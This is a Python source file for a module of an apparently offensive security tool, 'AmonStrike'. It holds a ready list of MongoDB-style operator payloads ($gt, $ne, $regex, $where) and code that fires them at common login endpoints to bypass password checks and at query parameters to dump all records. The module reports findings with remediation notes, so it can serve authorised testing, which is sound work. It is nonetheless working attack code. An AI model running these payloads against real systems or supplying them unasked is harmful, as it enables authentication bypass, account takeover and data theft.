"""
AmonStrike — NoSQL Injection Module
MongoDB/CouchDB/Redis injection for auth bypass and data theft.
"""
import json
from .base import BaseModule

NOSQL_PAYLOADS = [
    # Auth bypass
    {"$gt":""},
    {"$ne":"invalid"},
    {"$exists":True},
    {"$regex":".*"},
    {"$where":"1==1"},
    # Array injection
    ["admin","' or '1'=='1"],
]

class NosqlInjectionModule(BaseModule):
    NAME        = "nosql_injection"
    DESCRIPTION = "NoSQL injection — MongoDB auth bypass, $where, $regex"

    def run(self):
        self.log("Testing NoSQL injection...")
        self._test_login_bypass()
        self._test_query_injection()
        self.log(f"NoSQL complete — {len(self.findings)} findings", "+")
        return self.result()

    def _test_login_bypass(self):
        login_paths = ["/api/login","/api/auth","/login","/api/v1/auth"]
        for path in login_paths:
            r = self.get(path)
            if not r or r.status_code == 404: continue
            for payload in NOSQL_PAYLOADS[:4]:
                data = {"username": "admin", "password": payload,
                        "email": {"$gt":""}}
                r2 = self.post(path, json=data)
                if r2 and r2.status_code in [200,201]:
                    resp = r2.text.lower()
                    if any(w in resp for w in ["token","session","success","welcome","dashboard"]):
                        self.add_finding(
                            title       = f"NoSQL Injection — Authentication Bypass at {path}",
                            severity    = "CRITICAL",
                            description = (
                                f"MongoDB/NoSQL authentication bypass at {path}. "
                                f"Payload {json.dumps(payload)} bypasses password check. "
                                "Full account takeover without credentials."
                            ),
                            evidence    = f"Path: {path}\nPayload: {json.dumps(data)}\nResponse: {r2.text[:300]}",
                            remediation = "Sanitize all inputs. Use typed schemas. Disable $where operator.",
                            url         = self.url + path, parameter="password",
                            payload     = json.dumps(payload), cve="CWE-943",
                        )
                        break

    def _test_query_injection(self):
        params = ["search","query","q","find","filter","id","user","email"]
        for param in params:
            for payload_str in ['{"$gt":""}','{"$ne":null}','{"$regex":".*"}']:
                r = self.get(params={param: payload_str})
                if not r: continue
                if r.status_code == 200 and len(r.text) > 100:
                    try:
                        data = r.json()
                        if isinstance(data, list) and len(data) > 0:
                            self.add_finding(
                                title       = f"NoSQL Injection — Data Leak via '{param}'",
                                severity    = "HIGH",
                                description = f"NoSQL operator in '{param}' returns all documents.",
                                evidence    = f"Param: {param}={payload_str}\nRecords returned: {len(data)}\nSample: {str(data[0])[:200]}",
                                remediation = "Reject inputs containing $ operators. Use parameterized queries.",
                                url         = self.url, parameter=param, payload=payload_str, cve="CWE-943",
                            )
                            break
                    except Exception: pass
